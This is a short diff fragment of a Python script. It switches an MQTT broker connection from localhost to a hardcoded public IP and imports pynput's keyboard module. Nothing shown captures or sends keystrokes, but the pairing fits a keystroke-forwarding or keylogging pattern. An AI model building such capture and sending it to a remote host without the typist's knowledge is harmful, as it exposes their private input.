@@ -5,7 +5,7 @@ import json
 
 print("Conectando ao MQTT Broker...")
 mqtt_client = mqtt.Client()
-mqtt_client.connect('localhost', 1883)
+mqtt_client.connect('18.216.253.208', 1883)
 
 
 from pynput import keyboard
